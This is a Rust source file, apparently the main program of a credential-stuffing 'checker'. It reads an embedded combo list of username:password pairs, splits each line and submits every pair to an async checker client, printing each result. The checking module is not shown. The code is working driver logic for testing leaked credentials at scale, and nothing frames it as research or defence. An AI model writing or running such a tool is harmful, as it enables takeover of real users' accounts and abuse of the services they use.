mod checker;

fn parse_combo_list() -> Vec<checker::Combo<'static>> {
    let mut combos = Vec::new();
    let combo_list = include_str!("../rsc/combolist.txt");
    for line in combo_list.lines() {
        let combo = line.trim().split(":").collect::<Vec<&str>>();
        if combo.len() != 2 {
            continue;
        }
        combos.push(checker::Combo {
            username: combo[0],
            password: combo[1],
        });
    }
    combos
}

#[tokio::main]
async fn main() {
    let checker_client = checker::Checker::new();
    for combo in parse_combo_list() {
        let res = checker_client.check_combo(combo).await.unwrap();
        println!("{:?}", res);
    }
}
